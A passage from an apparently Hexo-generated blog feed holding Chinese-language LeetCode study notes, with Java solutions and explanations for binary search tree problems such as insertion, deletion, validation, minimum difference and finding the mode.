&gt; q.val) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> lowestCommonAncestor(root.left,p,q);</span><br><span class="line">            <span class="comment">//注意判空</span></span><br><span class="line">            <span class="keyword">if</span>(left != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> left;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="comment">//缩小 确定范围在右子树</span></span><br><span class="line">        <span class="keyword">if</span>(root.val &lt; p.val &amp;&amp; root.val &lt; q.val) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> lowestCommonAncestor(root.right,p,q);</span><br><span class="line">            <span class="comment">//注意判空</span></span><br><span class="line">            <span class="keyword">if</span>(right != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//p、q一个在左一个在右 那就是root是根节点</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉搜索树中的插入操作"><a href="#二叉搜索树中的插入操作" class="headerlink" title="二叉搜索树中的插入操作"></a>二叉搜索树中的插入操作</h4><p>link：<a href="https://leetcode.cn/problems/insert-into-a-binary-search-tree/description/">701. 二叉搜索树中的插入操作 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>根据题目描述遍历比较插入即可，和上题一样可以缩小范围进行判断.<br>题目又说任意地方插入，我们选插入叶子节点，只要遍历当前节点为空就说明扎到了向上返回即可.</p><h6 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">insertIntoBST</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(val);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(val &lt; root.val) &#123;</span><br><span class="line">            root.left = insertIntoBST(root.left,val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(val &gt; root.val) &#123;</span><br><span class="line">            root.right = insertIntoBST(root.right,val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="删除二叉搜索树中的节点"><a href="#删除二叉搜索树中的节点" class="headerlink" title="删除二叉搜索树中的节点"></a>删除二叉搜索树中的节点</h4><p>link：<a href="https://leetcode.cn/problems/delete-node-in-a-bst/">450. 删除二叉搜索树中的节点 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>首先找到要删除的节点（如果是叶子节点的话删除不影响）只要不是叶子节点删除可以把右子树中的最小节点（即右子树的最左侧节点）或左子树中的最大节点（即左子树的最右侧节点）上移占位.<br>找目标删除的节点也可以用相同的方法缩小判断区间.<br><strong>六种可能性</strong><br>1.没有匹配key的节点<br>2.能找到但匹配值的为叶子节点<br>3.能找到匹配值不为叶子节点但<strong>左子树为空右子树也为空</strong><br>4.能找到匹配值不为叶子节点但<strong>左子树不为空右子树为空</strong><br>5.能找到匹配值不为叶子节点但<strong>左子树为空右子树不为空</strong><br>6.能找到匹配值不为叶子节点但<strong>左子树右子树都不为空</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">deleteNode</span><span class="params">(TreeNode root, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 找到要删除的节点</span></span><br><span class="line">        <span class="keyword">if</span> (root.val == key) &#123;</span><br><span class="line">            <span class="comment">// 情况1: 节点是叶子节点</span></span><br><span class="line">            <span class="keyword">if</span> (root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 情况2: 节点只有左子树</span></span><br><span class="line">            <span class="keyword">if</span> (root.left != <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> root.left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 情况3: 节点只有右子树</span></span><br><span class="line">            <span class="keyword">if</span> (root.left == <span class="literal">null</span> &amp;&amp; root.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> root.right;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 情况4: 节点有两个子树</span></span><br><span class="line">            <span class="keyword">if</span> (root.left != <span class="literal">null</span> &amp;&amp; root.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root.right;</span><br><span class="line">                <span class="keyword">while</span> (cur.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                    cur = cur.left;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 将左子树连接到右子树的最小节点</span></span><br><span class="line">                cur.left = root.left;</span><br><span class="line">                <span class="comment">// 返回右子树</span></span><br><span class="line">                <span class="keyword">return</span> root.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 递归调用</span></span><br><span class="line">        <span class="keyword">if</span> (root.val &lt; key) &#123;</span><br><span class="line">            root.right = deleteNode(root.right, key); <span class="comment">// 更新右子树</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            root.left = deleteNode(root.left, key); <span class="comment">// 更新左子树</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> root; <span class="comment">// 返回更新后的根节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">deleteNode</span><span class="params">(TreeNode root, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.val == key) &#123;</span><br><span class="line">            <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(root.left != <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> root.left;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> root.right;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//从左子树选取</span></span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root.left;</span><br><span class="line">                <span class="comment">//遍历找到左子树最右侧的节点</span></span><br><span class="line">                <span class="keyword">while</span>(cur.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                    cur = cur.right;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//将要删除节点的右子树连接到最右侧节点</span></span><br><span class="line">                cur.right = root.right;</span><br><span class="line">                <span class="comment">//更新当前节点为左子树的根节点</span></span><br><span class="line">                root = root.left;</span><br><span class="line">                <span class="keyword">return</span> root;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span>(root.val &lt; key) &#123;</span><br><span class="line">                root.right = deleteNode(root.right,key);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>( key &lt; root.val) &#123;</span><br><span class="line">                root.left = deleteNode(root.left,key);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong><br>为什么是cur.left &#x3D; root.left;?<br>假设我们有如下结构的树.</p><p><img src="/../imgs/2024-10/image-20241118141018034.png" alt="image-20241118141018034"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root.right; <span class="comment">// cur 现在指向 7</span></span><br><span class="line"><span class="keyword">while</span> (cur.left != <span class="literal">null</span>) &#123;</span><br><span class="line">    cur = cur.left; <span class="comment">// cur 最终指向 null（右子树最小节点）</span></span><br><span class="line">&#125;</span><br><span class="line">cur.left = root.left; <span class="comment">// 将左子树连接到最小节点</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;二叉搜索树的最近公共祖先&quot;&gt;&lt;a href=&quot;#二叉搜索树的最近公共祖先&quot; class=&quot;headerlink&quot; title=&quot;二叉搜索树的最近公共祖先&quot;&gt;&lt;/a&gt;二叉搜索树的最近公共祖先&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x14</title>
    <link href="https://yubut.github.io/2024/11/14/yub%E3%81%AEAlgorithm.0x14/"/>
    <id>https://yubut.github.io/2024/11/14/yub%E3%81%AEAlgorithm.0x14/</id>
    <published>2024-11-14T03:25:26.000Z</published>
    <updated>2024-11-14T13:08:32.477Z</updated>
    
    <content type="html"><![CDATA[<h4 id="验证二叉搜索树"><a href="#验证二叉搜索树" class="headerlink" title="验证二叉搜索树"></a>验证二叉搜索树</h4><p>link：<a href="https://leetcode.cn/problems/validate-binary-search-tree/description/">98. 验证二叉搜索树 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>搞清二叉搜索树的定义即可.(根节点的左子树比根节点小，右子树比根节点大且每个子树都满足)<br><img src="/../imgs/2024-10/image-20241114113444728.png" alt="image-20241114113444728"></p><p>但其实上述思路是是不对， 跑一下代码发现测试样例值通过了一部分.那是哪里出问题了？（烧烤）<br>比较的应该是左子树所有节点小于中间节点，右子树所有节点大于中间节点.<br><strong>查资料发现二叉搜索树也可以为空</strong></p><h6 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> validBST(Long.MIN_VALUE, Long.MAX_VALUE, root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">validBST</span><span class="params">(<span class="type">long</span> lower, <span class="type">long</span> upper, TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root.val &lt;= lower || root.val &gt;= upper) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> validBST(lower, root.val, root.left) &amp;&amp; validBST(root.val, upper, root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h6><p>采用pre指针遍历对比记录前一个节点内容，进行中序遍历比较.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">left</span> <span class="operator">=</span> isValidBST(root.left);</span><br><span class="line">        <span class="comment">//确保至少以及遍历过一个节点</span></span><br><span class="line">        <span class="keyword">if</span>(pre != <span class="literal">null</span> &amp;&amp; pre.val &gt;= root.val) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//更新节点</span></span><br><span class="line">        pre = root;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">right</span> <span class="operator">=</span> isValidBST(root.right);</span><br><span class="line">        <span class="keyword">return</span> left &amp;&amp; right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉搜索树的最小绝队差"><a href="#二叉搜索树的最小绝队差" class="headerlink" title="二叉搜索树的最小绝队差"></a>二叉搜索树的最小绝队差</h4><p>link：<a href="https://leetcode.cn/problems/minimum-absolute-difference-in-bst/description/">530. 二叉搜索树的最小绝对差 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>和上一题一样，用一个指针记录遍历比较再用一个大数值记录结果即可.【注意取值】</p><h6 id="中序遍历-1"><a href="#中序遍历-1" class="headerlink" title="中序遍历"></a>中序遍历</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getMinimumDifference</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//左</span></span><br><span class="line">        getMinimumDifference(root.left);</span><br><span class="line">        <span class="comment">//判断</span></span><br><span class="line">        <span class="keyword">if</span>(pre != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> root.val - pre.val;</span><br><span class="line">            <span class="keyword">if</span>(tmp &lt; result) &#123;</span><br><span class="line">                result = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//更新节点</span></span><br><span class="line">        pre = root;</span><br><span class="line">        <span class="comment">//右</span></span><br><span class="line">        getMinimumDifference(root.right);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉搜索树中的众数"><a href="#二叉搜索树中的众数" class="headerlink" title="二叉搜索树中的众数"></a>二叉搜索树中的众数</h4><p>link：<a href="https://leetcode.cn/problems/find-mode-in-binary-search-tree/">501. 二叉搜索树中的众数 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>最直接就是直接遍历搜索，使用Map比较记录.但是这样就失去了搜索二叉树的意义.<br>所以我们还是选择中序遍历的方式，需要定义count（记录当前节点出现的次数）和maxCount（出现次数最多的节点），再定义一个pre作为记录节点方便比较.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">//定义需要的参数</span></span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">maxCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] findMode(TreeNode root) &#123;</span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">        findMode1(root);</span><br><span class="line">        <span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[res.size()];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; res.size();i++) &#123;</span><br><span class="line">            result[i] 